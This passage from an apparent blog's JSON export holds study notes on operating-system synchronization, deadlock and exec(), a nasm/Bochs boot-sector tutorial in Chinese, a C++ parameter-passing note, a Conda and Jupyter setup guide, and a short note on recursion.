system! Busy waiting prevents the thread in the critical section from making progress! LocksLocks are a synchronization primitive used to implement critical sections. Threads acquire a lock when entering a critical section. Threads release a lock when leaving a critical section. SpinlocksWhat we have implemented today is known as a spinlock: lock for the fact that it guards a critical section (we will have more to say about locks next time), and spin describing the process of acquiring it. Spinlocks are rarely used on their own to solve synchronization problems. Spinlocks are commonly used to build more useful synchronization primitives. More Bank Example1234567void giveGWATheMoolah(account_t account, int largeAmount) &#123; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); notifyGWAThatHeIsRich(gwaHas); return;&#125; 1234567891011lock gwaWalletLock; // Need to initialize somewherevoid giveGWATheMoolah(account_t account, int largeAmount) &#123;+ lock_acquire(&amp;gwaWalletLock); int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas);+ lock_release(&amp;gwaWalletLock); notifyGWAThatHeIsRich(gwaHas); return;&#125; What happens if we call lock_acquire() while another thread is in the critical section? The thread acquiring the lock must wait until the thread holding the lock calls lock_release(). How To WaitHow do we wait? Active (or busy) waiting: repeat some action until the lock is released. Passive waiting: tell the kernel what we are waiting for, go to sleep, and rely on lock_release to awaken us. Spinning v. SleepingThere are cases where spinning is the right thing to do. When? Only on multicore systems. Why? On single core systems nothing can change unless we allow another thread to run! If the critical section is short. Balance the length of the critical section against the overhead of a context switch. When to SpinIf the critical section is short: When to SleepIf the critical section is long: How to SleepThe kernel provides functionality allowing kernel threads to sleep and wake on a key: thread_sleep(key): “Hey kernel, I’m going to sleep, but please wake me up when key happens.” thread_wake(key): “Hey kernel, please wake up all (or one of) the threads who were waiting for key.” Similar functionality can be implemented in user space. Thread Communication Locks are designed to protect critical sections. lock_release() can be considered a signal from the thread inside the critical section to other threads indicating that they can proceed. In order to receive this signal a thread must be sleeping. What about other kinds of signals that I might want to deliver? The buffer has data in it. Your child has exited. Condition VariablesA condition variable(条件变量) is a signaling mechanism allowing threads to: cv_wait until a condition is true, and cv_notify other threads when the condition becomes true. The condition is usually represented as some change to shared state. The buffer has data in it: bufsize &gt; 0. cv_wait: notify me when the buffer has data in it. cv_signal: I just put data in the buffer, so notify the threads that are waiting for the buffer to have data. Condition variable can convey more information than locks about some change to the state of the world. As an example, a buffer can be full, empty, or neither. If the buffer is full, we can let threads withdraw but not add items. If the buffer is empty, we can let threads add but not withdraw items. If the buffer is neither full nor empty, we can let threads add and withdraw items. We have three different buffer states (full, empty, or neither) and two different threads (producer, consumer). Why are condition variables a synchronization mechanism? Want to ensure that the condition does not change between checking it and deciding to wait! reference[1] https://stackoverflow.com/questions/8017507/definition-of-synchronization-primitive[2] https://baike.baidu.com/item/原语/3794081?fr=aladdin","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"实现操作系统1 - 配置","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-实现操作系统1-配置/","text":"工作环境nasmnasm是开源的汇编语言编译程序。 1brew install nasm 编写文档boot.asm: 123456789101112131415161718 org 07c00h ; where the code will be running mov ax, cs mov ds, ax mov es, ax call DispStr ; let&apos;s display a string jmp $ ; and loop foreverDispStr: mov ax, BootMessage mov bp, ax ; ES:BP = string address mov cx, 16 ; CX = string length mov ax, 01301h ; AH = 13, AL = 01h mov bx, 000ch ; RED/BLACK mov dl, 0 int 10h retBootMessage: db &quot;Hello, OS world!&quot;times 510-($-$$) db 0 ; fill zeros to make it exactly 512 bytesdw 0xaa55 ; boot record signature 用nasm编译： 1nasm boot.asm -o boot.bin 将引导扇区boot.bin写入软盘 1dd if=boot.bin of=boot.img bs=512 count=1 conv=notrunc bochsBochs是一个x86硬件平台的开源模拟器。它可以模拟各种硬件的配置。Bochs模拟的是整个PC平台，包括I/O设备、内存和BIOS。 1brew install bochs 拷贝配置样本到当前目录 1cp /usr/local/Cellar/bochs/2.6.9_2/share/doc/bochs/bochsrc-sample.txt . 然后正确配置里面的选项。 123456789101112131415161718192021222324252627282930############################################################### # Configuration file for Bochs（Mac） ################################################################ filename of ROM images romimage: file=$BXSHARE/BIOS-bochs-latest # VGAROMIMAGE# You now need to load a VGA ROM BIOS into C0000.vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest# what disk images will be used # 磁盘文件位置floppya: 1_44=/Users/larry/OSFromSratch/boot.img, status=inserted# choose the boot disk. boot: floppy# where do we send log messages? log: bochsout.txt# disable the mousemouse: enabled=0 # enable key mapping#keyboard:keymap=$BXSHARE/keymaps/x11-pc-us.map# how much memory the emulated machine will havemegs: 32 一切准备就绪，启动模拟器：1bochs -f bochsrc.txt 按c成功进入","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"}]},{"title":"Deadlock and exec","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-6-Deaklock-and-exec/","text":"Locking Multiple Resources Locks protect access to shared resources. Threads may need multiple shared resources to perform some operation. Consider two threads A and B that both need simultaneous access to resources 1 and 2: Thread A runs, grabs the lock for Resource 1. → CONTEXT SWITCH ← Thread B runs, grabs the lock for Resource 2. → CONTEXT SWITCH ← Thread A runs, tries to acquire the lock for Resource 2. → THREAD A SLEEPS ← Thread B runs, tries to acquire the lock for Resource 1. → THREAD B SLEEPS ← Now what? DeadlockDeadlock(死锁) occurs when a thread or set of threads are waiting for each other to finish and thus nobody ever does. Self DeadlockA single thread can deadlock. How? Thread A acquires Resource 1. Thread A tries to reacquire Resource 1. This seems inane. Why would this happen? foo() needs Resource 1. bar() needs Resource 1. While locking Resource 1 foo() calls bar(). Can we solve this problem? Yes! Recursive locks. Allow a thread to reacquire a lock that it already holds, as long as calls to acquire are matched by calls to release. This kind of problem is not uncommon. You may want to implement recursive locks for OS/161. (But don’t make the locks we gave you suddenly recursive…​) Conditions for DeadlockA deadlock cannot occur unless all of the following conditions are met: Protected access to shared resources, which implies waiting. No resource preemption, meaning that the system cannot forcibly take a resource from a thread holding it. Multiple independent requests, meaning a thread can hold some resources while requesting others. Circular dependency graph, meaning that Thread A is waiting for Thread B which is waiting for Thread C which is waiting for Thread D which is waiting for Thread A. Dining Philosophers “Classic” synchronization problem which I feel obligated to discuss. Illustrated below. wiki Feeding PhilosophersBreaking deadlock conditions usually requires eliminating one of the requirements for deadlock. Don’t wait: don’t sleep if you can’t grab the second chopstick and put down the first. Break cycles: usually by acquiring resources in a well-defined order. Number chopsticks 0–4, always grab the higher-numbered chopstick first. Break out: detect the deadlock cycle and forcibly take away a resource from a thread to break it. (Requires a new mechanism.) Don’t make multiple independent requests: grab both chopsticks at once. (Requires a new mechanism.) Deadlock v. StarvationStarvation(饥饿) is an equally-problematic condition in which one or more threads do not make progress. Starvation differs from deadlock in that some threads make progress and it is, in fact, those threads that are preventing the “starving” threads from proceeding. Deadlock v. Race ConditionsWhat is better: a deadlock (perhaps from overly careful synchronization) or a race condition (perhaps from a lack of correct synchronization)? I’ll take the deadlock. It’s much easier to detect! Using the Right Tool Most problems can be solved with a variety of synchronization primitives. However, there is usually one primitive that is more appropriate than the others. You will have a chance to practice picking synchronization primitives for ASST1, and throughout the class. Approaching Synchronization Problems Identify the constraints. Identify shared state. Choose a primitive. Pair waking and sleeping. Look out for multiple resource allocations: can lead to deadlock. Walk through simple examples and corner cases before beginning to code. $ wait %1 # Process lifecycle Change: exec() Death: exit() The Afterlife: wait() Groundhog DayIs fork() enough? .png) Change: exec() The exec() family of system calls replaces the calling process with a new process loaded from a file. The executable file must contain a complete blueprint indicating how the address space should look when exec() completes. What should the contents of memory be? Where should the first thread start executing? Linux and other UNIX-like systems use ELF (Executable and Linkable Format) as the standard describing the information in the executable file is structured. $ readelf # display ELF information $ /lib/ld-linux.so.2 exec() Argument Passing The process calling exec() passes arguments to the process that will replace it through the kernel. The kernel retrieves the arguments from the process after the call to exec() is made. It then pushes them in to the memory of the process where the replacement process can find them when it starts executing. This is where main gets argc and argv! exec() also has an interesting return, almost the dual of fork(): exec() never returns! $exec() exec() File Handle Semantics By convention exec does not modify the file table of the calling process! Why not? Remember pipes? Don’t undo all the hard work that fork() put in to duplicating the file table!","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"C++ Primer (6) - 函数","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/C-C-Primer-6-函数C-Primer-12-动态内存/","text":"6.1函数基础6.2参数传递形参(parameter)的类型决定了形参和实参(argument)交换的方式： 引用传递(passed by reference)：如果形参是引用类型(即&amp;)，它将绑定到对应的实参上； 值传递(passed by value)：否则，将实参的值拷贝后赋给形参。 6.3返回类型和return语句6.4函数重载6.7函数指针","tags":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/tags/C/"},{"name":"Memory","slug":"Memory","permalink":"http://larryim.cc/tags/Memory/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"Python配置","date":"2017-03-29T16:00:00.000Z","path":"2017/03/30/TOOLS-Python配置/","text":"AnacondaAnaconda (/ˌænə’kɑndə/)是一个用于科学计算的python发行版，支持各种系统，提供了包管理和环境管理的功能。Anaconda 利用conda来进行package和environment的管理。 Conda的包管理Conda既是一个工具，也是一个可执行命令，其核心功能是包管理和环境管理。包管理与pip使用类似。 1234567891011121314# 安装packageconda install package# 查看已经安装的packagesconda list# 查找package信息conda search package# 更新packageconda update -n python27 package# 删除packageconda remove -n python27 package Conda的环境管理Conda可以创建/激活/删除某一个环境。 1234567891011# 创建一个名为python27的环境，指定Python版本是2.7conda create --name python27 python=2.7# 安装好后，使用activate激活某个环境source activate python27 # 激活后，会发现terminal输入的地方多了python27的字样，实际上，此时系统做的事情就是把默认环境从PATH中去除，再把2.7对应的命令加入PATH# 如果想返回python 2.7环境，运行source deactivate python27 # for Linux &amp; Mac# 删除一个已有的环境conda remove --name python27 --all 使用Requirement.txt 安装1while read requirement; do conda install --yes $requirement; done &lt; requirements.txt 使用Pycharm在Pycharm配置里选用Anaconda的python编译器所在位置即可。 使用Jupyter notebook时，点击Run Cell，它会弹出提示框，要求输入token。接下来在Terminal里运行Jupyter Notebook，就会出现如下结果： 拷贝token以后的字符串到提示框，等待连接完成。 如果已经有jupyter notebook在运行，而且你忘了token的话，可以输入jupyter notebook list查询当前运行的notebook。 Jupyter NoteBookAnaconda默认自带Jupyter Notebook，可以很方便的运行Python代码、记录笔记。在terminal输入jupyter note book，会自动新建浏览器页面，也就是notebook。 主题Jupyter Notebook的主题可以调整，首先安装主题: 1pip install --upgrade jupyterthemes 选择好主题后，切换主题: 1jt -t theme_name -T -N Bash KernelBash kernel(Project Link)可以通过pip安装 12pip install bash_kernelpython -m bash_kernel.install Install Python2/3 KernelInstall install with 12python3 -m pip install ipykernelpython3 -m ipykernel install --user 在PyCharm中配置anaconda的解释器选择project interpreter, 接着点击 project interpreter 的右边的小齿轮，选择 add local ，选择anaconda文件路径下的python。接着PyCharm会更新解释器，导入模块等，要稍等一点时间。 ResourcesConda Cheat Sheet Reference Installing the IPython kernel Python virtualenvInstallInstall virtualenv using conda instead of pip, because it might raise error (see on StackOverflow) 1conda install virtualenv create your environmentNow you can create your python environment for your particular programs. For example, under the folder your project, you create an environment called .venv by: 1virtualenv --no-site-packages .venv The command --no-site-packages requires the environment should not access to global site-packages (as default now). Before running your program in your created environment, you need to activate it: 1source .venv/bin/activate And remember to deactivate it whenever you are done: 1deactivate","tags":[],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"Recursion","date":"2017-01-29T16:00:00.000Z","path":"2017/01/30/Algorithm-Recursion/","text":"来自 Problem Solving with Algorithm and Data Structures Using Python，Release 3.0, Chapter 4, Page 117 学习笔记。 DefinitionRecursion is a method of solving problems that involves breaking a problem down into smaller and smaller subproblems until you get into a small enough problem that it can be solved trivially. Usually recursion involves a function calling itself. A recursive function is a function that calls itself. The Three Laws of Recursion A recursive algorithm must have a base case. A recursive algorithm must change its state and move toward the base case. A recursive algorithm must call, recursively","tags":[{"name":"Recursion","slug":"Recursion","permalink":"http://larryim.cc/tags/Recursion/"}],"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://larryim.cc/categories/Algorithm/"}]}]}